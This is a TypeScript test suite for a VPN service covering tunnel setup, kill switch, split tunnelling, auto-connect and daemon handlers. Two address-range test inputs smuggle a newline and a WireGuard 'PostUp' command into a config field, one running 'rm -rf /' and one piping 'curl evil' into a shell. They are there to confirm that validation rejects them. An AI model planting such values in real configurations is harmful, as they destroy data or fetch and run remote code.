import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterAll, describe, expect, it } from "vitest";

import { createHandlers } from "../src/core/handlers";
import { type VpnDeps, type VpnSettings, VpnService, validCidr } from "../src/core/vpn-service";
import { createDaemonHost } from "../src/daemon";
import type { WifiStatus } from "../src/engine/system";
import * as vpn from "../src/engine/vpn";
import * as vpnGuard from "../src/engine/vpn-guard";

const folders: string[] = [];
afterAll(async () => {
  for (const f of folders) await rm(f, { recursive: true, force: true });
});
async function temp() {
  const dir = await mkdtemp(join(tmpdir(), "qalaa-vpn-"));
  folders.push(dir);
  return dir;
}

const KEY = "aGVsbG8gd29ybGQgdGhpcyBpcyAzMiBieXRlcyBrZXk=";
const peer = { peer: { id: "p1", name: "laptop", address: "10.8.0.2/32" }, address: "10.8.0.2/32", dns: "10.8.0.1", server_public_key: KEY, endpoint: "vpn.example.org:51820", allowed_ips: "0.0.0.0/0, ::/0" };

async function fakes(overrides: Partial<VpnDeps> = {}, start: Partial<VpnSettings> = {}) {
  const dir = await temp();
  let settings: VpnSettings = { vpnKillSwitch: false, vpnKillSwitchAllowLan: true, vpnSplitMode: "full", vpnSplitCidrs: [], vpnAutoConnect: false, vpnTrustedNetworks: [], ...start };
  let state: vpn.TunnelState = "not_imported";
  let wifi: WifiStatus = { ssid: "Home", security: "WPA2", risk: "ok" };
  const calls: string[] = [];
  const events: unknown[] = [];
  const tunnelFile = join(dir, "qalaa-vpn.conf");
  const deps: VpnDeps = {
    platform: "linux",
    tunnelFile,
    account: async () => ({ deviceId: "d1", token: "t", email: "a@example.com", server: "https://q.example" }),
    settings: () => settings,
    saveSettings: async (changes) => {
      settings = { ...settings, ...changes };
      calls.push(`save ${Object.keys(changes).join(",")}`);
    },
    tunnel: {
      state: async () => state,
      keyPair: () => ({ privateKey: KEY, publicKey: KEY }),
      requestPeer: async (_a, publicKey) => {
        calls.push(`register ${publicKey.slice(0, 4)}`);
        return peer;
      },
      build: (config, privateKey) => vpn.buildConfig(config, privateKey),
      save: async (text) => {
        await writeFile(tunnelFile, text);
        return tunnelFile;
      },
      importFile: async () => {
        calls.push("import");
        state = "disconnected";
      },
      connect: async () => {
        calls.push("connect");
        state = "connected";
      },
      disconnect: async () => {
        calls.push("disconnect");
        state = "disconnected";
      },
    },
    guard: {
      capable: () => true,
      applySplit: (config, mode, cidrs) => vpnGuard.applySplitTunnel(config, mode, cidrs),
      killSwitchScript: (host, allowLan) => `nft-on ${host} lan=${allowLan}`,
      removeKillSwitchScript: () => "nft-off",
      shouldAutoConnect: (w, p) => vpnGuard.shouldAutoConnect(w, p),
    },
    elevate: async (script) => void calls.push(`pkexec ${script}`),
    wifi: async () => wifi,
    emit: (_e, payload) => events.push(payload),
    ...overrides,
  };
  const svc = new VpnService(deps);
  return { svc, calls, events, tunnelFile, settings: () => settings, setWifi: (w: WifiStatus) => (wifi = w), setState: (s: vpn.TunnelState) => (state = s) };
}

describe("VPN service", () => {
  it("address ranges are checked before they reach the tunnel file", () => {
    for (const ok of ["10.0.0.0/8", "192.168.1.0/24", "fd00::/8", "0.0.0.0/0"]) expect(validCidr(ok), ok).toBe(true);
    for (const bad of ["10.0.0.0", "10.0.0.0/33", "fd00::/129", "example.com/24", "10.0.0.0/8\nPostUp = rm -rf /", "1.2.3.4/24/1", ""]) expect(validCidr(bad), bad).toBe(false);
  });

  it("set up: keys made here, the public key registered, the tunnel saved and imported", async () => {
    const { svc, calls, tunnelFile } = await fakes();
    expect((await svc.status())).toMatchObject({ linked: true, saved: false, state: "not_imported" });
    const status = await svc.setup();
    expect(calls).toEqual(["register aGVs", "import"]);
    expect(status).toMatchObject({ saved: true, state: "disconnected" });
    const text = await readFile(tunnelFile, "utf8");
    expect(text).toContain("Endpoint = vpn.example.org:51820");
    expect(text).toContain("AllowedIPs = 0.0.0.0/0, ::/0");
  });

  it("needs a linked account and a saved tunnel", async () => {
    const unlinked = await fakes({ account: async () => null });
    await expect(unlinked.svc.setup()).rejects.toMatchObject({ code: "not_linked" });
    const { svc } = await fakes();
    await expect(svc.connect()).rejects.toMatchObject({ code: "not_set_up" });
  });

  it("connects and disconnects", async () => {
    const { svc } = await fakes();
    await svc.setup();
    expect((await svc.connect()).state).toBe("connected");
    expect((await svc.disconnect()).state).toBe("disconnected");
  });

  it("kill switch: installed with a password prompt for the tunnel's server; declined saves nothing", async () => {
    const { svc, calls, settings } = await fakes();
    await svc.setup();
    await svc.setKillSwitch({ on: true });
    expect(calls).toContain("pkexec nft-on vpn.example.org lan=true");
    expect(settings().vpnKillSwitch).toBe(true);
    await svc.setKillSwitch({ on: false });
    expect(calls).toContain("pkexec nft-off");

    const declined = await fakes({
      elevate: async () => {
        throw new Error("Request dismissed");
      },
    });
    await expect(declined.svc.setKillSwitch({ on: true })).rejects.toMatchObject({ code: "failed", message: "Request dismissed" });
    expect(declined.settings().vpnKillSwitch).toBe(false);
    const mac = await fakes({ platform: "darwin", guard: { ...(await fakes()).svc["deps"].guard, capable: () => false } });
    await expect(mac.svc.setKillSwitch({ on: true })).rejects.toMatchObject({ code: "unavailable" });
  });

  it("split tunnelling rebuilds the saved tunnel at once", async () => {
    const { svc, tunnelFile } = await fakes();
    await svc.setup();
    await svc.setGuard({ splitMode: "only", splitCidrs: ["10.20.0.0/16", " 10.20.0.0/16 "] });
    const text = await readFile(tunnelFile, "utf8");
    expect(text).toMatch(/AllowedIPs = 10\.20\.0\.0\/16\s*$/m);
    expect((await svc.status()).splitCidrs).toEqual(["10.20.0.0/16"]);
    await expect(svc.setGuard({ splitCidrs: ["10.0.0.0/8\nPostUp = curl evil | sh"] })).rejects.toMatchObject({ code: "bad_params" });
    await expect(svc.setGuard({ splitMode: "most" })).rejects.toMatchObject({ code: "bad_params" });
    expect(await readFile(tunnelFile, "utf8")).not.toContain("PostUp");
  });

  it("changing LAN access refreshes the kill switch while it's on", async () => {
    const { svc, calls } = await fakes({}, { vpnKillSwitch: true });
    await svc.setup();
    await svc.setGuard({ allowLan: false });
    expect(calls.filter((c) => c.startsWith("pkexec")).at(-1)).toBe("pkexec nft-on vpn.example.org lan=false");
  });

  it("trusted Wi-Fi names are 1 to 32 bytes", async () => {
    const { svc } = await fakes();
    expect((await svc.setGuard({ trusted: ["Home", "Office 5G"] })).trusted).toEqual(["Home", "Office 5G"]);
    await expect(svc.setGuard({ trusted: [""] })).rejects.toMatchObject({ code: "bad_params" });
    await expect(svc.setGuard({ trusted: ["x".repeat(33)] })).rejects.toMatchObject({ code: "bad_params" });
    await expect(svc.setGuard({})).rejects.toMatchObject({ code: "bad_params" });
  });

  it("auto-connect: once on an untrusted network, never fighting the person turning it off", async () => {
    const { svc, calls, events, setWifi, setState } = await fakes({}, { vpnAutoConnect: true, vpnTrustedNetworks: ["Home"] });
    expect(await svc.autoTick()).toBe(false); // not set up yet
    await svc.setup();
    expect(await svc.autoTick()).toBe(false); // on trusted Home
    setWifi({ ssid: "Cafe", security: "", risk: "open" });
    expect(await svc.autoTick()).toBe(true);
    expect(calls.at(-1)).toBe("connect");
    expect(events.at(-1)).toMatchObject({ kind: "vpn", autoConnected: true, network: "Cafe" });
    expect((await svc.status()).autoConnectedOn).toBe("Cafe");
    // The person turns it off on the same network: stays off.
    setState("disconnected");
    expect(await svc.autoTick()).toBe(false);
    // Home, then another untrusted network: acts again.
    setWifi({ ssid: "Home", security: "WPA2", risk: "ok" });
    expect(await svc.autoTick()).toBe(false);
    setWifi({ ssid: "Airport", security: "WPA2", risk: "ok" });
    expect(await svc.autoTick()).toBe(true);
    // A wired connection or an unknown Wi-Fi state is left alone.
    setState("disconnected");
    setWifi({ ssid: null, security: null, risk: "none" });
    expect(await svc.autoTick()).toBe(false);
  });

  it("auto-connect is refused where the system can't do it", async () => {
    const base = await fakes();
    const mac = await fakes({ platform: "darwin", guard: { ...base.svc["deps"].guard, capable: () => false } });
    await expect(mac.svc.setGuard({ autoConnect: true })).rejects.toMatchObject({ code: "unavailable" });
    expect(mac.settings().vpnAutoConnect).toBe(false);
  });
});

/** The same file is decoded by the Rust client's tests (apps/desktop-native/crates/qalaa-ipc). */
const VPN_FIXTURE = join(__dirname, "../../desktop-native/crates/qalaa-ipc/tests/fixtures/vpn.json");

it("VPN replies match the fixture the Rust client decodes", async () => {
  const { svc, setWifi } = await fakes({}, { vpnAutoConnect: true, vpnTrustedNetworks: ["Home"], vpnKillSwitch: true });
  await svc.setup();
  await svc.setGuard({ splitMode: "exclude", splitCidrs: ["192.168.50.0/24"] });
  setWifi({ ssid: "Cafe", security: "", risk: "open" });
  await svc.autoTick();
  const status = await svc.status();
  const fixture = { status: { ...status, platform: "linux" } };
  if (process.env.UPDATE_FIXTURES) await writeFile(VPN_FIXTURE, `${JSON.stringify(fixture, null, 2)}\n`);
  expect(JSON.parse(await readFile(VPN_FIXTURE, "utf8"))).toEqual(JSON.parse(JSON.stringify(fixture)));
});

describe.skipIf(process.platform === "win32")("VPN over the daemon", () => {
  it("an unlinked computer says so, and invalid routing never reaches settings", async () => {
    const dataDir = await temp();
    await writeFile(join(dataDir, "settings.json"), JSON.stringify({ serverUrl: "http://127.0.0.1:9" }));
    const host = await createDaemonHost(dataDir);
    const h = createHandlers(host, () => {});
    const status = (await h["vpn.get"]!(undefined)) as { linked: boolean; saved: boolean };
    expect(status).toMatchObject({ linked: false, saved: false });
    await expect(h["vpn.setup"]!(undefined)).rejects.toMatchObject({ code: "not_linked" });
    await expect(h["vpn.guard"]!({ splitCidrs: ["not a range"] })).rejects.toMatchObject({ code: "bad_params" });
    await h["vpn.guard"]!({ splitMode: "exclude", splitCidrs: ["192.168.0.0/16"] });
    const saved = JSON.parse(await readFile(join(dataDir, "settings.json"), "utf8"));
    expect(saved).toMatchObject({ vpnSplitMode: "exclude", vpnSplitCidrs: ["192.168.0.0/16"] });
  });
});
